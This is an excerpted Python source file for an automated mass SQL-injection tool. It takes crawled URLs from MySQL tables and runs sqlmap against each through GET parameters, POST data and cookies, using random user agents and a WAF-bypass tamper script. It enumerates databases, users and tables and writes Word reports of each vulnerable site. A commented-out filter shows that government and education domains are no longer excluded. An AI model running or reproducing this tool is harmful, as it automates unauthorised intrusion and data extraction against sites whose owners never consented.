...
level_s = int(cfg.get("Scan_Levels", "Scan_Level"))
...
def Check_Inj_Result(content):
    ...
    if 'use only' in content and '---' in content and 'sqlmap was not able to fingerprint the back-end database management syste' not in content:
        return 'ACCESS'
    if '---' in content and 'sqlmap was not able to fingerprint the back-end database management syste' not in content:
        return 'MYSQL'
...
def Run_Sqlmap(common):
    ...
    try:
        ...
        print('[{}] Scan : '.format(str(datetime.datetime.now()).split('.')[0]) + common.replace(
            '--random-agent --dbs  --current-user --current-db --is-db --tamper=bypass.py --batch', '').replace('sqlmap\\', ''))
    except:
        pass
    try:
...
def Common_Database(document, common, content, url, sqlurl):
    ...
    try:
        ...
        document.add_paragraph('执行命令:' + common.replace('sqlmap\\',''), 'ZhongHei')
        ...
        try:
            ...
            writedata(str(e))
        document.add_paragraph('网站漏洞复现【SQLMAP版本号1.2.11.6#dev】', 'Subtitle')
        document.add_paragraph('使用的Tamper脚本如下:bypass.py', 'DaHei')
        document.add_paragraph(''''
        #!/usr/bin/env python
        ...
        def tamper(payload, **kwargs):
            ...
            return payload
        ''', 'ZhongHOng')
        document.add_paragraph('SQLMAP 1.2.11.6版本 下载地址：http://www.langzi.fun/upload/sqlmap_1.2.11.6版本.rar','ZhongHOng')

        document.add_paragraph('执行命令', 'DaHei')
        document.add_paragraph(common.replace('sqlmap\\',''), 'ZhongHOng')
        document.add_paragraph('返回结果', 'DaHei')
        document.add_paragraph(str(content), 'XiaoLv')
...
def Get_Column(document, common, content):
    ...
    try:
        ...
        document.add_paragraph(str(all_column), 'ZhongHOng')
...
def main(url):
    ...
    domain = url_p.netloc
    try:
        filename = url.split('//')[1].split('/')[0] + '__-__页面存在SQL注入漏洞.docx'
    except:
        pass
    try:
        filename = domain.replace(':', '_').replace('/', '_') + '__-__页面存在SQL注入漏洞.docx'
    except:
        pass
    finally:
    ...
    :return:
    '''
    common_1 = 'python sqlmap\sqlmap.py -u {} --random-agent --dbs  --current-user --current-db --is-db --tamper=bypass.py --batch'.format(
        url)
    ...
    if Check_Inj_Result(result_1) == 'ACCESS':
        # 如果为access类，需要获取表的名
        common_2 = 'python sqlmap\sqlmap.py -u {} --tables --tamper=bypass.py --random-agent --batch'.format(url)
    ...
    if Check_Inj_Result(result_1) == 'MYSQL':
        ...
        # 获取当前数据库名，尝试获取表明
        if current_db:
            common_3 = 'python sqlmap\sqlmap.py -u {} -D {} --tables --tamper=bypass.py --random-agent --batch'.format(
                url, current_db)
...
def main2(url):
    ...
    # 这里截断出url 和 values
    common_4 = 'python sqlmap\sqlmap.py -u {} --data {} --level 2  --random-agent --dbs  --current-user --current-db --is-db --tamper=bypass.py --batch'.format(
        urls, datas)
    ...
    if Check_Inj_Result(result_4) == 'ACCESS':
        common_5 = 'python sqlmap\sqlmap.py -u {} --data {} --tables --level 2 --tamper=bypass.py --random-agent --batch'.format(
            urls, datas)
    ...
    if Check_Inj_Result(result_4) == 'MYSQL':
        ...
        if current_db:
            common_6 = 'python sqlmap\sqlmap.py -u {} --data {} -D {} --tables --level 2 --tamper=bypass.py --tables  --random-agent --batch'.format(
                urls, datas, current_db)
    ...
    common_4 = 'python sqlmap\sqlmap.py -u {} --cookie {} --level 2  --random-agent --dbs  --current-user --current-db --is-db --tamper=bypass.py --batch'.format(
        urls, datas)
    ...
    if Check_Inj_Result(result_4) == 'ACCESS':
        common_5 = 'python sqlmap\sqlmap.py -u {} --cookie {} --tables --level 2  --random-agent --tamper=bypass.py --batch'.format(
            urls, datas)
        result_5 = Run_Sqlmap(common_5)
        Get_Column(document, common_5.replace('--batch', ''), result_5)
        Scan_Status = 1
    ...
    if Check_Inj_Result(result_4) == 'MYSQL':
        ...
        current_db = Get_Mysql_Current_Data_Name(result_4)
        if current_db:
            common_6 = 'python sqlmap\sqlmap.py -u {} --cookie {} -D {} --tables --level 2  --random-agent --tamper=bypass.py --batch'.format(
                urls,
                datas,
                current_db)
            result_6 = Run_Sqlmap(common_6)
...
def scan(sem):
    ...
    while 1:
        ...
        with connect_mysql() as conn:
            sql1 = 'select links from Sec_Links_0 where sqls=0 limit 1'
            sql2 = 'update Sec_Links_0 set sqls=1 where sqls=0 limit 1'
            conn.execute(sql1)
            res = conn.fetchone()
            Url_Links = []
            if res != None:
        ...
        sem.release()
        if Url_Links != []:
            for html_link in Url_Links:
                #if '.gov.cn' not in html_link and '.edu.cn' not in html_link:
                    dix = main(html_link)
                    if dix == 'SCAN OVER':
                        break

        if level_s == 1 or level_s == 3:
            sem.acquire()
            with connect_mysql() as conn:
                sql1 = 'select links from Sec_Links_1 where sqls=0 limit 1'
                sql2 = 'update Sec_Links_1 set sqls=1 where sqls=0 limit 1'
                conn.execute(sql1)
                res = conn.fetchone()
                if res == None:
                    sem.release()
                ...
                sem.release()
            if Url_Links:
                for id_link in Url_Links:
                    #if '.gov.cn' not in id_link and '.edu.cn' not in id_link:
                        dix = main(id_link.replace('&', '^&').replace('|', '^|'))
                        if dix == 'SCAN OVER':
                            break
                        dix2 = main2(id_link.replace('&', '^&').replace('|', '^|'))
                        if dix2 == 'SCAN OVER':
                            break

        if level_s == 2 or level_s == 3:
            sem.acquire()
            with connect_mysql() as conn:
                sql1 = 'select links from Sec_Links_2 where sqls=0 limit 1'
                sql2 = 'update Sec_Links_2 set sqls=1 where sqls=0 limit 1'
                conn.execute(sql1)
                res = conn.fetchone()
                if res == None:
                    sem.release()
...
def test_start():
    with connect_mysql() as conn:
        if level_s == 1 or level_s == 3:
            sql1 = 'select count(id) from Sec_Links_0 where sqls=0'
            conn.execute(sql1)
            res = conn.fetchone()
            if res == None:
                ...
                if cou > thread_s*2:
                    ...
                    time.sleep(60)
            sql1 = 'select count(id) from Sec_Links_1 where sqls=0'
            conn.execute(sql1)
            res = conn.fetchone()
            if res == None:
                print('数据库暂时无超链接数据可提取，自动等待开启')
                ...
                if cou > thread_s*2:
                    ...
                    time.sleep(60)
        if level_s == 2 or level_s == 3:
            sql1 = 'select count(id) from Sec_Links_2 where sqls=0'
            conn.execute(sql1)
            res = conn.fetchone()
            if res == None:
                print('数据库暂时无超链接数据可提取，自动等待开启')
